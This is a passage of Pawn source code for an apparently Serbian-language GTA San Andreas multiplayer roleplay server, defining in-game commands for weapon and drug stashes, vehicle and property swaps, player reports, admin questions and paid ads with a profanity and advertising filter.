				    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
				}
				case 2:
				{
		            GiveWeaponToPlayer( playerid, 25, 100 );
					GiveWeaponToPlayer( playerid, 24, 100 );
		            ServerInfo[ HangarPaket ]--;
		            PlayerInfo[ playerid ][ xHangarTime ] = 15;

					SendInfoMessage( playerid, "Uzeli ste paket 2 iz hangara sa Shotgun(100) i Deagle(100)." );

		            if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

					new str_hang[100];
					format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
				    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
				}
				case 3:
				{
				    GiveWeaponToPlayer( playerid, 34, 75 );
					GiveWeaponToPlayer( playerid, 29, 200 );
		            ServerInfo[ HangarPaket ]--;
		            PlayerInfo[ playerid ][ xHangarTime ] = 15;

					SendInfoMessage( playerid, "Uzeli ste paket 3 iz hangara sa Sniper(75) i MP5(200)." );

		            if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

					new str_hang[100];
					format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
				    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
				}
				case 4:
				{
				    GiveWeaponToPlayer( playerid, 26, 50 );
		            ServerInfo[ HangarPaket ]--;
		            PlayerInfo[ playerid ][ xHangarTime ] = 15;

					SendInfoMessage( playerid, "Uzeli ste paket 4 iz hangara sa Sawnoff Shotgun(50)." );

		            if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

					new str_hang[100];
					format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
				    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
				}
			}
		}
		else return SendErrorMessage( playerid, "Morate biti kod hangara." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:uzmidrogu( playerid )
{
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Morate biti level 2+." );

	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA )
	{
        if( IsPlayerInRangeOfPoint( playerid, 3.0, 2411.4688,-2490.3281,13.6389 ) )
		{
			if( ServerInfo[ SkladisteDroga ] == 0 ) return SendErrorMessage( playerid, "Trenutno nema droge u skladistu, stize na svakih pola sata." );

			if( PlayerInfo[playerid][xTorba_Droga] < 100000 )
			{
			    PlayerInfo[playerid][xTorba_Droga] += ServerInfo[ SkladisteDroga ];
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

				SCMF( playerid, 0x4282C0FF, "(DROGA): Uzeli ste {FFFFFF}(%dg) droge iz skladista.", ServerInfo[ SkladisteDroga ] );
				ServerInfo[ SkladisteDroga ] = 0;

				if(IsValidDynamic3DTextLabel(ServerInfo[ SDrogaLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SDrogaLabel ]);

				new string_droga[ 80 ];
				format( string_droga, sizeof( string_droga ), "(HANGAR[DROGA] - [%d/500g])\nDa uzmete paket kucajte \"/uzmidrogu\"", ServerInfo[ SkladisteDroga ] );
		    	ServerInfo[ SDrogaLabel ] = CreateDynamic3DTextLabel( string_droga, -1, 2411.4688,-2490.3281,13.6389, 10.0, IPI, IVI, 1, -1, -1 );
			}
			else SendErrorMessage( playerid, "Nemate mesta gde da stavite drogu." );
        }
		else return SendErrorMessage( playerid, "Morate biti kod skladista droge." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:zamenavozila( playerid, const params[] )
{
	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) )
	{
	    SendUsageMessage( playerid, "/zamenavozila [id] [vas slot vozila] [igracev slot vozila]" );
	    return 1;
    }

    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
    if( moj < 1 || moj > MAX_VEH_SLOT || njegov < 1 || njegov > MAX_VEH_SLOT ) return SendErrorMessage( playerid, "Slotovi ne moze ispod 1 ili iznad %d.", MAX_VEH_SLOT );
	new slot1 = moj-1, slot2 = njegov-1;
	if( player_veh[ playerid ][ vehicle_id ][ slot1 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u tom slotu." );
    if( player_veh[ id ][ vehicle_id ][ slot2 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u tom slotu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

	new coordsstring[ 144 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac {4282C0}%s {FFFFFF}vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}U zameni je ponudjeno vozilo marke {4282C0}%s.\n", GetVehicleNameEx( GetVehicleModel( player_veh[ playerid ][ vehicle_id ][ slot1 ] ) ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac od vas trazi vozilo marke {4282C0}%s.\n", GetVehicleNameEx( GetVehicleModel( player_veh[ id ][ vehicle_id ][ slot2 ] ) ) );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, "{FFFFFF}Izaberite da li prihvatate ili odbijate zamenu.\n\n" );
	strcat( DialogStrgEx, "{FF0000}UKOLIKO DODJE DO PREVARE SLIKAJTE I PRIJAVITE NA FORUM." );

	ShowPlayerDialog( id, dialog_ZAMENA_2, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	GlobalID[ id ] = player_veh[ playerid ][ vehicle_id ][ slot1 ];
	GlobalID_2[ id ] = player_veh[ id ][ vehicle_id ][ slot2 ];
	GlobalProdaja[ id ] = playerid;

	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu vozila igracu %s.", ImeIgraca( id ) );
	SendInfoMessage( playerid, "Vase vozilo: %s | Njegovo vozilo: %s", GetVehicleNameEx( GetVehicleModel( player_veh[ playerid ][ vehicle_id ][ slot1 ] ) ), GetVehicleNameEx( GetVehicleModel( player_veh[ id ][ vehicle_id ][ slot2 ] ) ) );
	return 1;
}

CMD:zamenaimovina( playerid, const params[] )
{
	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) )
	{
	    SendUsageMessage( playerid, "/zamenaimovina [id] [vas slot imovine] [igracev slot imovine]" );
	    return 1;
    }

    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
    if( moj < 1 || moj > 3 || njegov < 1 || njegov > 3 ) return SendErrorMessage( playerid, "Slotovi ne moze ispod 1 ili iznad 3." );
	new slot1 = moj-1, slot2 = njegov-1;
	if( PlayerInfo[ playerid ][ xProperty ][ slot1 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u tom slotu." );
    if( PlayerInfo[ id ][ xProperty ][ slot2 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema imovine u tom slotu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

	new coordsstring[ 144 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac {4282C0}%s {FFFFFF}vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}U zameni je ponudjena {4282C0}%s vrednosti $%d.\n", GetPropertyAName( PlayerInfo[ playerid ][ xProperty ][ slot1 ] ), II[ PlayerInfo[ playerid ][ xProperty ][ slot1 ] ][ iPrice ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac od vas trazi {4282C0}%s vrednosti $%d.\n", GetPropertyName( PlayerInfo[ id ][ xProperty ][ slot2 ] ), II[ PlayerInfo[ id ][ xProperty ][ slot2 ] ][ iPrice ] );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, "{FFFFFF}Izaberite da li prihvatate ili odbijate zamenu.\n\n" );
	strcat( DialogStrgEx, "{FF0000}UKOLIKO DODJE DO PREVARE SLIKAJTE I PRIJAVITE NA FORUM." );

	ShowPlayerDialog( id, dialog_ZAMENA_4, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	GlobalID[ id ] = PlayerInfo[ playerid ][ xProperty ][ slot1 ];
	GlobalID_2[ id ] = PlayerInfo[ id ][ xProperty ][ slot2 ];
	GlobalProdaja[ id ] = playerid;

	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu imovine igracu {4282C0}%s.", ImeIgraca( id ) );
	return 1;
}

CMD:zamenafirmi( playerid, const params[] )
{
	new id, moj, njegov;

	if( sscanf( params, "uii", id, moj, njegov ) )
	{
	    SendUsageMessage( playerid, "/zamenafirmi [id]" );
	    return 1;
    }

    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
	if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Nemate firmu." );
    if( PlayerInfo[ id ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Igrac nema firmu." );
    if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca.");

    new coordsstring[ 144 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac {4282C0}%s {FFFFFF}vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}U zameni je ponudjena {4282C0}firma - %s.\n", BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bName ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Igrac od vas trazi {4282C0}firmu  - %s.\n", BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bName ] );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, "{FFFFFF}Izaberite da li prihvatate ili odbijate zamenu.\n\n" );
	strcat( DialogStrgEx, "{FF0000}UKOLIKO DODJE DO PREVARE SLIKAJTE I PRIJAVITE NA FORUM." );

	ShowPlayerDialog( id, dialog_ZAMENA_3, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	GlobalProdaja[ id ] = playerid;

	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu firmi igracu {4282C0}%s.", ImeIgraca( id ) );
	SendInfoMessage( playerid, "Vasa firma: {4282C0}%s {FFFFFF}| Njegova firma: {4282C0}%s", BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bName ], BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bName ] );
	return 1;
}

CMD:bacikljuc( playerid )
{
	if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == -1 ) return SendErrorMessage( playerid, "Nemas rezervne kljuceve koje bi mogao da bacis." );
	PlayerInfo[ playerid ][ xRezervniKljucevi ] = -1;
	sql_user_update_integer( playerid, "reserve_keys", PlayerInfo[ playerid ][ xRezervniKljucevi ] );
    SendInfoMessage( playerid, "Bacio si rezervni kljuc." );
    return 1;
}

CMD:dajkljuc( playerid, const params[] )
{
	new id, vozilo;

    if( sscanf( params, "ui", id, vozilo ) ) return SendUsageMessage( playerid, "/dajkljuc [id] [slot vozila]" );
	if( vozilo < 1 || vozilo > MAX_VEH_SLOT ) return SendErrorMessage( playerid, "Pogresan broj slota vozila." );

	new slot = vozilo-1;

	if( player_veh[ playerid ][ vehicle_id ][ slot ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u ovom slotu." );
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes dati kljuc sam sebi!" );
    if( !IsPlayerNearPlayer( 3.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !" );
    if( PlayerInfo[ id ][ xRezervniKljucevi ] != -1 ) return SendErrorMessage( playerid, "Taj igrac vec ima rezervne kljuceve!" );

	PlayerInfo[ id ][ xRezervniKljucevi ] = VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ slot ] ][ vSqlID ];

	sql_user_update_integer( id, "reserve_keys", PlayerInfo[ id ][ xRezervniKljucevi ] );

	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
	PlayerPlaySound( id, 1052, 0.0, 0.0, 0.0);
	SendInfoMessage( playerid, "Dao si kljuc za auto %s", ImeIgraca( id ) );
	SendInfoMessage( id, "Dobio si kljuc za auto od %s", ImeIgraca( playerid ) );

	SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s vadi kljuceve svog auta i daje ih %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	return 1;
}

CMD:report( playerid, const params[] )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
    if( ServerInfo[ Report ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slanje reporta Admin timu." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[playerid][xAdmin] != 0 || PlayerInfo[playerid][xGamemaster] != 0 || PlayerInfo[playerid][xSpecAdmin] != 0 ) return SendErrorMessage(playerid, "Ne mozete vi poslati /askq | /pitaj.");

	new rstring[128];
	if( sscanf( params, "s[128]", rstring ) ) return SendUsageMessage( playerid, "/report [text]" );
	if( strlen(rstring) > 128 || strlen(rstring) < 1 ) return SendErrorMessage(playerid, "Tekst prijave ne moze biti preko 128 slova i ispod 1.");
    if( gettime() < ReportGlobal[ playerid ] ) return SendErrorMessage( playerid, "Morate cekati %d sekundi prije novog reporta!", ReportGlobal[ playerid ] - gettime() );

 	ReportGlobal[ playerid ] = gettime()+60;

	foreach(new i : Player)
	{
 		if( PlayerInfo[ i ][ xAdmin ] >= 1 || PlayerInfo[ i ][ xSpecAdmin ] >= 1 )
		{
  			SCMF( i, 0xFF0000FF, "#REPORT: {FFFFFF}%s[%d] {FF0000}| Tekst: {FFFFFF}%s", ImeIgraca( playerid ), playerid, rstring );
		}
	}
 	SendClientMessage( playerid, ZUTA, "(REPORT): Online Admin ce reagovati u najkracem mogucem roku." );
 	SCMF( playerid, ZUTA, "(REPORT): Vas report glasi: {FFFFFF}%s" , rstring );
 	return 1;
}

CMD:pitaj( playerid, const params[] )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
    if( !ServerInfo[ Pitanja ]) return SendErrorMessage( playerid, "Trenutno nije moguce slanje pitanja Admin Teamu." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( gettime() < PitajTajmer[ playerid ] ) return SendErrorMessage( playerid, "Morate cekati %d sekundi pre novog pitanja!", PitajTajmer[ playerid ] - gettime() );
    if( askqInfo[ playerid ][ askqSended ]) return SendErrorMessage( playerid, "Vec si poslao pitanje, nije vam odgovoreno ili nisi pogledao." );
    if( PlayerInfo[playerid][xAdmin] != 0 || PlayerInfo[playerid][xGamemaster] != 0 || PlayerInfo[playerid][xSpecAdmin] != 0 ) return SendErrorMessage(playerid, "Vi ne mozete poslati pitanje.");

    new text[ 128 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/pitaj [text]" );
	if(strlen(text) < 1 || strlen(text) > 128) return SendErrorMessage(playerid, "Tekst pitanja ne moze biti ispod 1 slova i preko 128.");

	new askQ = -1;
	for( new id = 1; id < MAX_ASKQS; id++ )
	{
		if(!askqList[ id ][ askqSend ])
		{
			askQ = id;
			break;
		}
	}
    if( askQ == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj poslatih pitanja." );

	askqList[ askQ ][ askqSend ] = true;
	askqList[ askQ ][ askqID ] = playerid;

	askqInfo[ playerid ][ askqSended ] = true;
	askqInfo[ playerid ][ askqAnswered ] = false;

	strmid( askqList[ askQ ][ askqOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32 );
	strmid( askqList[ askQ ][ askqQuestion ], text, 0, strlen( text ), 128 );

	SendInfoMessage( playerid, "Poslao si pitanje Adminima i Gamemasterima." );

	if(PlayerInfo[playerid][xLevel] >= 10)
	{
	    SendInfoMessage(playerid, "Posto ste level 10+ platili ste $500 za pitanje.");
	    DajIgracuNovac(playerid, -500);
	}
	GMChat( 0x3333CCAA, "#ASKQ [/lp > %d]: {FFFFFF}%s[%d] {3333CC}| Tekst: {FFFFFF}%s", askQ, ImeIgraca( playerid ), playerid, text );

	PitajTajmer[ playerid ] = gettime()+45;
    return 1;
}
alias:pitaj( "askq" );

CMD:podg( playerid )
{
	if(!askqInfo[ playerid ][ askqSended ]) return SendErrorMessage( playerid, "Nisi poslao pitanje." );
    if(!askqInfo[ playerid ][ askqAnswered ]) return SendErrorMessage( playerid, "Nije odgovoreno na tvoje pitanje." );

	new string[ 200 ];
	format( string, sizeof( string ), "* Admin/Gamemaster {FFFFFF}%s {A9C4E4}je odgovorio na tvoje pitanje.\n\n\
										Odgovor: {FFFFFF}Postovan%s, %s", askqInfo[ playerid ][ askqAdmin ], getPolForString(playerid, "i", "a"), askqInfo[ playerid ][ askqAnswer ] );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

	askqInfo[ playerid ][ askqSended ] = false;
	askqInfo[ playerid ][ askqAnswered ] = false;
	strmid( askqInfo[ playerid ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
	strmid( askqInfo[ playerid ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );
	return 1;
}

CMD:new( playerid )
{
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da koristis ovu komandu dok si u zatvoru." );
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozes zvati [ /new ] ako si u interioru!");
	if( PlayerInfo[ playerid ][ xLevel ] > 1 ) return SendErrorMessage( playerid, "Samo do levela 2." );
    if( gettime() < NewGlobal[ playerid ] ) return SendErrorMessage( playerid, "Morate cekati %d sekundi prije novog [ /newa ].", NewGlobal[playerid] - gettime());

    NewGlobal[ playerid ] = gettime()+600;

	GMChat( 0x33CCFFFF, "*** Igrac %s[%d] je novi na serveru i trazio je pomoc.", ImeIgraca( playerid ), playerid );

	SendClientMessage( playerid, 0x33CCFFAA, "#NEW: {FFFFFF}Poslali ste zahtev za pomoc, Staff ce vam se ubrzo obratiti ukoliko je online.");
	return 1;
}

CMD:stats( playerid )
{
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );
	ShowDialogStats( playerid, playerid );
	return 1;
}

CMD:smsad( playerid, const params[] )
{
	if(!ServerInfo[ Oglasi ]) return SendErrorMessage( playerid, "Trenutno nije moguce slati oglase." );
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Nisi level 2!");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete poslati oglas dok ste u jailu / prisonu.");
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage(playerid, "Ne mozete dat oglas, mutirani ste.");
    if(PlayerInfo[playerid][xOglasWarn] >= 3) return SendErrorMessage(playerid, "Ne mozete postaviti oglas jer ste oglas-banovani.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/smsad [text]");
	if(strlen(params) < 1 || strlen(params) > 64) return SendErrorMessage(playerid, "Ne moze ispod 1 slova ili preko 64.");

	for( new i = 0; i < strlen( params ); i++ )
	{
 		if(strfind( params[ i ], "server", true) == 0
	   		|| strfind( params[ i ], "IP", true) == 0
	        || strfind( params[ i ], ".", true) == 0
			|| strfind( params[ i ], ":1", true) == 0
			|| strfind( params[ i ], ":2", true) == 0
			|| strfind( params[ i ], ":3", true) == 0
			|| strfind( params[ i ], ":4", true) == 0
			|| strfind( params[ i ], ":5", true) == 0
			|| strfind( params[ i ], ":6", true) == 0
			|| strfind( params[ i ], ":7", true) == 0
			|| strfind( params[ i ], ":8", true) == 0
			|| strfind( params[ i ], ":9", true) == 0
			|| strfind( params[ i ], ";", true) == 0
			|| strfind( params[ i ], "jebem", true) == 0
			|| strfind( params[ i ], "bog", true) == 0
			|| strfind( params[ i ], "mater", true) == 0
			|| strfind( params[ i ], "kreten", true) == 0
			|| strfind( params[ i ], "admin", true) == 0
			|| strfind( params[ i ], "jebeni", true) == 0
			|| strfind( params[ i ], ".com", true) == 0
			|| strfind( params[ i ], ".net", true) == 0
			|| strfind( params[ i ], ".org", true) == 0
			|| strfind( params[ i ], ".info", true) == 0
			|| strfind( params[ i ], "www", true) == 0
			|| strfind( params[ i ], "glup", true) == 0
			|| strfind( params[ i ], "majka", true) == 0
			|| strfind( params[ i ], "majku", true) == 0)
  		{
    		SendErrorMessage( playerid, "Nedozvoljene rijeci/znakovi u oglasu!");
         	return 1;
    	}
	}
	if(gettime() < adds && PlayerInfo[ playerid ][ xVIPLevel ] < 3) return SendErrorMessage( playerid, "Pokusaj ponovno (%d) sekundi izmedju oglasa.", adds - gettime());

	new payout = strlen(params) * 2;
	if( PlayerInfo[ playerid ][ xTelefonBon ] < payout ) return SendErrorMessage( playerid, "Nemate dovoljno novaca na racunu (cena toliko znakova: $%d).", payout);

	OOCNews( 0x2D8EB7FF, "[(SMS)OGLAS] | {DDE047}Oglas: {FFFFFF}%s", params );
	OOCNews( 0x2D8EB7FF, "[(SMS)OGLAS] | {DDE047}Kontakt: {FFFFFF}%s[%d] {2D8EB7}| {DDE047}Broj: {FFFFFF}%d", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xBrojTelefona ] );

	adds = gettime()+60;

	PlayerInfo[ playerid ][ xTelefonBon ] -= payout;
	format( globalstring, sizeof( globalstring ), "~r~Placeno za reklamu: $%d", payout);
	GameTextForPlayer( playerid, globalstring, 5000, 5 );
	BussinesOglasMoney( payout );
    return 1;
}

CMD:ad( playerid, const params[] )
{
	if( ServerInfo[ Oglasi ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce slati oglase." );
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Nisi level 2!");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete poslati oglas dok ste u jailu / prisonu.");
	if( !IsPlayerInRangeOfPoint( playerid, 5.0, 1691.0156, -1343.3184, 17.4276 ) ) return SendErrorMessage( playerid, "Morate biti kod oglasnika da bi ste mogli poslati oglas!");
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0 ) return SendErrorMessage( playerid, "Nemate mobilni telefon." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage(playerid, "Ne mozete dat oglas, mutirani ste.");
    if(PlayerInfo[playerid][xOglasWarn] >= 3) return SendErrorMessage(playerid, "Ne mozete postaviti oglas jer ste oglas-banovani.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/ad [text]");
	if(strlen(params) < 1 || strlen(params) > 64) return SendErrorMessage(playerid, "Ne moze ispod 1 slova ili preko 64.");

	for( new i = 0; i < strlen( params ); i++ )
	{
 		if(strfind( params[ i ], "server", true) == 0
	   		|| strfind( params[ i ], "IP", true) == 0
	        || strfind( params[ i ], ".", true) == 0
			|| strfind( params[ i ], ":1", true) == 0
			|| strfind( params[ i ], ":2", true) == 0
			|| strfind( params[ i ], ":3", true) == 0
			|| strfind( params[ i ], ":4", true) == 0
			|| strfind( params[ i ], ":5", true) == 0
			|| strfind( params[ i ], ":6", true) == 0
			|| strfind( params[ i ], ":7", true) == 0
			|| strfind( params[ i ], ":8", true) == 0
			|| strfind( params[ i ], ":9", true) == 0
			|| strfind( params[ i ], ";", true) == 0
			|| strfind( params[ i ], "jebem", true) == 0
			|| strfind( params[ i ], "bog", true) == 0
			|| strfind( params[ i ], "mater", true) == 0
			|| strfind( params[ i ], "kreten", true) == 0
			|| strfind( params[ i ], "admin", true) == 0
			|| strfind( params[ i ], "jebeni", true) == 0
			|| strfind( params[ i ], ".com", true) == 0
			|| strfind( params[ i ], ".net", true) == 0
			|| strfind( params[ i ], ".org", true) == 0
			|| strfind( params[ i ], ".info", true) == 0
			|| strfind( params[ i ], "www", true) == 0
			|| strfind( params[ i ], "glup", true) == 0
			|| strfind( params[ i ], "majka", true) == 0
			|| strfind( params[ i ], "majku", true) == 0)
  		{
    		SendErrorMessage( playerid, "Nedozvoljene rijeci/znakovi u oglasu!");
         	return 1;
    	}
	}
	if(adds < gettime() && PlayerInfo[ playerid ][ xVIPLevel ] < 3) return SendErrorMessage( playerid, "Pokusaj ponovno (%d) sekundi izmedju oglasa.", adds - gettime());

	new payout = strlen(params) * 2;
	if( PlayerInfo[ playerid ][ xNovac ] < payout) return SendErrorMessage( playerid, "Nemate dovoljno novaca (cena toliko znakova: $%d).", payout);

	OOCNews( 0x2D8EB7FF, "[OGLAS] | {DDE047}Oglas: {FFFFFF}%s", params );
	OOCNews( 0x2D8EB7FF, "[OGLAS] | {DDE047}Kontakt: {FFFFFF}%s[%d] {2D8EB7}| {DDE047}Broj: {FFFFFF}%d", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xBrojTelefona ] );

	adds = gettime()+60;

	DajIgracuNovac( playerid, -payout );
	format( globalstring, 50, "~r~Placeno za reklamu: $%d", payout);
	GameTextForPlayer( playerid, globalstring, 5000, 5 );
	BussinesOglasMoney( payout );
    return 1;
}

CMD:kupifakture( playerid, const params[] )
{
	if( !IsPlayerInRangeOfPoint(playerid, 2.0, -1873.1703, 2665.5222, 3.5894)) return SendErrorMessage( playerid, "Morate biti kod saltera u Opstini.");

	new fakture;
    if( sscanf( params, "d", fakture ) ) return SendUsageMessage(playerid, "/kupifakture (1x100$)");
    if( fakture < 5 || fakture > 50 ) return SendErrorMessage(playerid, "Fakture ne mogu ispod 5 i preko 50.");
    if( (KupljeneFakture[ playerid ] + fakture) > 50 ) return SendErrorMessage(playerid, "Ne mozete kupiti toliko faktura, imate %d, mozete kupiti jos %d.", KupljeneFakture[playerid], 50-KupljeneFakture[playerid]);

	if( PlayerInfo[ playerid ][ xNovac ] < fakture*100 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

	KupljeneFakture[ playerid ] += fakture;
	SendInfoMessage( playerid, "Kupio si %d faktura za biznis za $%d, idi ubaci ih u biznis.", fakture, fakture*100 );
	DajIgracuNovac( playerid, -fakture*100 );
	return 1;
}

CMD:poslovi( playerid ) {
	if( !IsPlayerInRangeOfPoint(playerid, 2.0, -1847.6321, 2656.1096, 3.6158)) return SendErrorMessage( playerid, "Morate biti kod saltera u Opstini!");

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    strcat( DialogStrgEx, "#\tIme posla\n" );
    for( new i = 0; i < MAX_JOBS; i++ ) {
        format( DialogStrgEx, sizeof( DialogStrgEx ), "%s{4282C0}(%d)\t%s\n", DialogStrgEx, i+1, jobsInfos[ i ][ jName ] );
	}
	ShowPlayerDialog( playerid, dialog_JOBLIST, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, DialogStrgEx, "Potvrdi", "Odustani" );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:exit( playerid )
{
